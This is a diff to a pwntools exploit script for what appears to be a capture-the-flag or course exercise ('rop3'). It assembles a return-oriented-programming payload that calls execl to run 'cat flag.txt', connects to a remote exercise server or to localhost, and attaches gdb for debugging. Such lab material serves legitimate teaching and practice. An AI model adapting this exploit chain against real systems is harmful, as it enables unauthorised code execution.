@@ -35,7 +35,21 @@ payload += p64(pop_rcx_or_al_ret)
 payload += p64(0)  # null terminate
 payload += p64( execpl_offset)  # call execpl to execute "cat flag.txt"
 
+def get_process():
+    if args.REMOTE:
+        return remote('lettieri.iet.unipi.it', 4493)
+    else:
+        return remote('localhost', 4493)
 
-p = remote("lettieri.iet.unipi.it", 4493)
+context.binary = ELF('./rop3')
+local_instance = process('./rop3')
+context.terminal = ["tmux", "splitw", "-h"]
+gdb.attach(local_instance, """
+           set follow-fork-mode child
+           set detach-on-fork off
+           br child
+           """)
+pause()
+p = get_process()
 p.sendline(payload)
 p.interactive()
